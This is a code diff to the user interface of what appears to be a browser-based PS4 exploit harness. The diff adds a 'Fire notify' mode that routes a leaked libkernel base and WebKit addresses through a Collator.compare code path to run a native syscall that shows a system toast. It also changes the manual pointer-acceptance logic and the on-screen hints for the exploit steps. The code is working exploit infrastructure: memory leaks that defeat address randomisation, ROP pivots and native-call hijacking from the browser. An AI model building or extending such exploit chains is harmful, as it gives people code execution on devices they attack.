@@ -87,9 +87,10 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     applyPivotHookForFire,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
+import { runCollatorNotify } from "./slopkit_notify.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bi";
+const BUILD_ID = "rw-20250830bj";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -285,6 +286,7 @@ let scanQuiet = false;
 let scanRenderPending = 0;
 let lkQuiet = false;
 let nativeQuiet = false;
+const notifyRetain = [];
 const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
 const _scanBytes = new Array(8);
 const _win16 = new Array(16);
@@ -312,7 +314,7 @@ function mark(tag, detail) {
         return;
     }
     if (nativeQuiet) {
-        if (/^NATIVE-|^PIVOT-|^BASES|^STUBS|^ERROR|^HINT|^BISECT|^SMOKE|^PREP-PIN/.test(tag)) {
+        if (/^NATIVE-|^NOTIFY-|^PIVOT-|^BASES|^STUBS|^ERROR|^HINT|^BISECT|^SMOKE|^PREP-PIN/.test(tag)) {
             lines.push(line);
             if (lines.length > 48) lines.splice(0, lines.length - 48);
             crashLog.append(line, tag);
@@ -374,9 +376,12 @@ function setUi() {
     if (btnNative) {
         btnNative.disabled = busy || !ready || !nativeAllowed;
         const nm = getNativeMode();
-        if (nativeStaged) {
+        if (nativeStaged && nm !== "notify") {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
             btnNative.title = "lk hot — Fire getpid without reload";
+        } else if (nm === "notify") {
+            btnNative.textContent = "Fire notify";
+            btnNative.title = "Collator.compare → notification (no expm1 pivot)";
         } else {
             btnNative.textContent = nm === "smoke" ? "Fire smoke" : (nm === "usleep" ? "Fire usleep" : "Fire getpid");
             btnNative.title = "smoke: set before Start, or Verify pivot then Fire";
@@ -397,6 +402,7 @@ function setUi() {
     if (btnForceLk) {
         btnForceLk.disabled = busy;
         btnForceLk.textContent = "Accept lk";
+        btnForceLk.title = "16KB lk base (…000), or fn ptr (auto-routes to fn accept)";
     }
     if (btnAcceptFn) {
         btnAcceptFn.disabled = busy;
@@ -3314,10 +3320,8 @@ function acceptLkFromHex(hexOverride) {
     }
 
     if (calcLkFromFnPtrZeroRead(ptr, off).length) {
-        mark("LK-SKIP", hex + " looks like fn ptr — use Accept fn (0 reads, no lk peek)");
-        state("use Accept fn button", "warn");
-        renderOut();
-        return false;
+        mark("LK-HINT", hex + " is fn ptr — accepting via fn path (0 reads)");
+        return acceptFnFromHex(hex);
     }
 
     const asBase = verifyLibkernelZeroRead(ptr, off, { via: "manual-base" });
@@ -5108,11 +5112,75 @@ function wireNativeBisectBar() {
     }
 }
 
-function runFireGetpid() {
+function runFireNotify() {
     if (busy || !ready || !window.p || !nativeAllowed) return;
     const p = window.p;
     const off = loadEffectiveOff();
+    const lk = lkFromUi();
+    if (!lk) {
+        mark("NOTIFY-SKIP", "2e → paste k_usleep fn → Accept fn → Fire notify");
+        renderOut();
+        return;
+    }
+
+    busy = true;
+    nativeQuiet = true;
+    lkQuiet = true;
+    const bases = basesFromSession(off);
+    mark("NOTIFY-FIRE", "Collator path build=" + BUILD_ID + " lk=" + lk);
+    renderOut();
+
+    try {
+        for (let i = 0; i < notifyRetain.length; i++)
+            retained.push(notifyRetain[i]);
+        const out = runCollatorNotify({
+            p,
+            off,
+            lk,
+            webkitBase: bases.webkitBase || chainWebkitBase(off),
+            nativeFn: bases.nativeFn,
+            leakval: p.leakval,
+            retain: notifyRetain,
+            params,
+            log: mark,
+        });
+        if (out.sent) {
+            mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
+            state("notification sent — check PS4 toast", "ok");
+            try {
+                saveLibkernelSession(lk, null, { forced: true });
+                crashLog.append("NOTIFY-OK result=0", "NOTIFY-OK");
+            } catch (_) { }
+        } else if (out.ok) {
+            mark("NOTIFY-RET", "syscall returned " + out.result + " (want 0)");
+            state("notify errno " + out.result, "warn");
+        } else {
+            mark("NOTIFY-FAIL", "bad return " + out.result);
+            state("notify failed", "bad");
+        }
+    } catch (err) {
+        mark("NOTIFY-FAIL", (err.message || String(err)) + " build=" + BUILD_ID);
+        mark("NOTIFY-HINT", "RE gd/gps on 13.52 — ?gd=0x…&gps=0x… or fix lk via 2e");
+        state("notify failed", "bad");
+    } finally {
+        nativeQuiet = false;
+        lkQuiet = false;
+        busy = false;
+        setUi();
+        renderOut();
+        try { crashLog.flushSync(); } catch (_) { }
+    }
+}
+
+function runFireGetpid() {
+    if (busy || !ready || !window.p || !nativeAllowed) return;
     const nm = getNativeMode();
+    if (nm === "notify") {
+        runFireNotify();
+        return;
+    }
+    const p = window.p;
+    const off = loadEffectiveOff();
     const lk = lkFromUi();
     if (nm !== "smoke" && !lk) {
         mark("NATIVE-SKIP", "paste lk → Accept lk → Fire getpid");
@@ -5436,12 +5504,12 @@ async function runStart() {
             mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
         }
         renderOut();
-        mark("HINT", "Verify pivot (POP+G0-G5) → bisect N2-N5 or Fire smoke");
+        mark("HINT", "2e Leak+lk → Fire notify (Collator) — or legacy Verify pivot for expm1");
         mark("PAIR-STATUS", "state=" + pairStatus.state
             + " promoted=" + pairStatus.promoted);
         ready = true;
         ensureUiVisible();
-        state("primitive OK — Verify pivot, then Fire smoke/getpid", "ok");
+        state("primitive OK — 2e lk then Fire notify", "ok");
     } catch (err) {
         state("failed: " + err.message, "bad");
         mark("ERROR", err.stack || err.message);
@@ -5614,7 +5682,7 @@ function init() {
     wireGroomBar(() => busy);
     setUi();
     renderOut();
-    state("Start → Verify pivot → Fire smoke or 2e+getpid", "");
+    state("Start → 2e lk → Fire notify", "");
 }
 
 function bootUi() {
